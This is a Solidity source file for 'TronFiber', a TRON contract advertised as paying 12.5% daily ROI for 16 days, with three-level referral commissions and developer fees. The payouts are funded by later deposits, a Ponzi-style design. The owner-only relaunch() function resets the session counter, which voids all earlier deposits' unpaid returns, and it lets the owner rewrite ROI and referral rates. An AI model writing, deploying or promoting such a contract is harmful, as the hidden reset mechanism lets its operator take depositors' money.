//SourceUnit: tronfiber.sol

/**
 *
 *  TronFiber
 *
 *  Official website:  https://tronfiber.cc/
 *  Crowdfunding And Investment Program: 12.5% Daily ROI for 16 Days.
 *
 *  Referral Program
 *  1st Level = 8%
 *  2nd Level = 4%
 *  3rd Level = 1%
 *
 *  Development Fee = 3%
 *  Marketing Fee   = 4%
 *
**/
pragma solidity 0.5.9;

contract TronFiber {

    address payable public _dev;

    struct Deposit {
		uint session;
        uint256 amount;
        uint256 time;
    }
	
    struct User {
        address upline;
        uint256 dividends;
        uint256 match_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
    }
	
	uint16 contract_length;
	uint16 contract_roi;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
	
	uint public prelaunch;
	uint public launch_date;
	uint public total_session;
    
    uint8[] public ref_bonuses;

    mapping(address => User) public players;

    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
	
    constructor() public {
	
        _dev = msg.sender;
		
		prelaunch = 1610064000;
		launch_date = 1610107200;
		contract_length = 16;
		contract_roi = 200;
		
        ref_bonuses.push(8);
        ref_bonuses.push(4);
        ref_bonuses.push(1);
		
		total_session = 0;
    }
	
	function relaunch(uint _newdate, uint16 _length, uint16 _roi, uint8 _ref1, uint8 _ref2, uint8 _ref3) external payable {
		
		require(msg.sender == _dev);
		
		prelaunch = _newdate;
		launch_date = _newdate + 43200;
		contract_length = _length;
		contract_roi = _roi;
		
		ref_bonuses[0] = _ref1;
		ref_bonuses[1] = _ref2;
		ref_bonuses[2] = _ref3;
		
		total_session++;
	}
    
    function deposit(address _upline) external payable {
	
		require(msg.value >= 100 trx, "100 TRX MINIMUM");
		require(now >= prelaunch, "Not Yet Available!");

        User storage player = players[msg.sender];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline);

        player.deposits.push(Deposit({
			session: total_session,
            amount: msg.value,
            time: (now > launch_date) ? now : launch_date
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        _dev.transfer(msg.value * 7 / 100);
        
        emit NewDeposit(msg.sender, msg.value);
    }
    
    function withdraw() external payable {
	
		require(now > launch_date, "Not Yet Allowed");
		
        User storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0, "Zero amount");

        uint256 amount = player.dividends;

        player.dividends = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

		if(amount >= address(this).balance) {
			msg.sender.transfer(address(this).balance);
		} else {
			msg.sender.transfer(amount);
		}
        
        emit Withdraw(msg.sender, amount);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);
        if(payout > 0) {
            players[_addr].last_payout = now;
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            uint256 bonus = _amount * ref_bonuses[i] / 100;
			if(now < launch_date) {
				bonus = _amount * (ref_bonuses[i] + 5) / 100;
			}
            if(up == address(0)) {
				_dev.transfer(bonus);
			} else {
				address payable _up = address(uint160(up));
				_up.transfer(bonus);
				players[up].total_match_bonus += bonus;
				up = players[up].upline;
			}
            match_bonus += bonus;
            emit MatchPayout(up, _addr, bonus);
        }
    }

    function _setUpline(address _addr, address _upline) private {
        if(players[_addr].upline == address(0) && _addr != _dev) {
            if(players[_upline].deposits.length == 0) {
                _upline = _dev;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline);
            
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        User storage player = players[_addr];

		value = 0;
		
        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];

			if(dep.session == total_session) {
				uint256 time_end = dep.time + contract_length * 86400;
				uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
				uint256 to = now < time_end ? now : time_end;

				if(from < to) {
					value += dep.amount * (to - from) * contract_roi / contract_length / 8640000;
				}
			}
        }

        return value;
    }

    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure, uint[4][100] memory deposits) {
        User storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }
		
		for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];

			if(dep.session == total_session) {
				uint256 time_end = dep.time + contract_length * 86400;
				uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
				uint256 to = now < time_end ? now : time_end;

				if(from < to) {
					deposits[i][2] = time_end - now;
					deposits[i][3] = dep.amount * (to - from) * contract_roi / contract_length / 8640000;
				} else {
					deposits[i][2] = 0;
					deposits[i][3] = 0;
				}
				
				deposits[i][0] = dep.time;
				deposits[i][1] = dep.amount;
			}
        }

        return (
            payout + player.dividends + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure,
			deposits
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus, uint _launch_date, uint _prelaunch) {
        return (invested, withdrawn, match_bonus, launch_date, prelaunch);
    }
}